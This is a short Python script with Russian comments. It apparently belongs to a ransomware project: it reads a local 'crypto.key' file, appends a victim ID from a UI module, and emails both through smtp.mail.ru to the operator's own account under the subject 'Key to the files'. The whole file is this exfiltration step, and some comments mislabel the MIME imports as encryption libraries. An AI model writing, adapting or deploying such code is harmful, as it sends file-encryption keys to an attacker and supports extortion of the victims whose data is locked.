# импортируем библиотеки для работы с почтой
import smtplib  # импорт библиотеки для работы с протоколами SMTP
from email.mime.text import MIMEText  # импортируем библиотеки для шифрования сообщения
from email.mime.multipart import MIMEMultipart  # импортируем библиотеки для шифрования сообщения
from ui1 import ID

email = "*****"  # почта отправителя
password = "*****"  # ключ к приложению


def send_mail():
    msg = MIMEMultipart()  # создаем объект сообщения
    msg["Subject"] = "Ключ к файлам"  # прописываем заголовок
    msg["From"] = email  # подписываем отправителя
    with open("crypto.key", "r") as fil:  #открываем файл с ключом для чтения
        body = fil.read()  #передаем значение файла в переменную
    body += "\nID = " + str(ID)

    msg.attach(MIMEText(body, "plain"))  # добавляем в письмо текст

    # подключаемся к серверу mail.ru
    server = smtplib.SMTP_SSL("smtp.mail.ru", 465)  # подключаемся к серверу smtp
    server.login(email, password)  # подключаемся к конкретному почтовому аккаунту
    server.sendmail(email, email, msg.as_string())  # отправляем сообщение,
    # указываем отправителя и получателя в нашем случае это одна и та же почта
    server.quit()  # выполняем выход с сервера


# если наш файл будет именно запущен, а не импортирован, то сработает это условие
if __name__ == "__main__":
    send_mail()
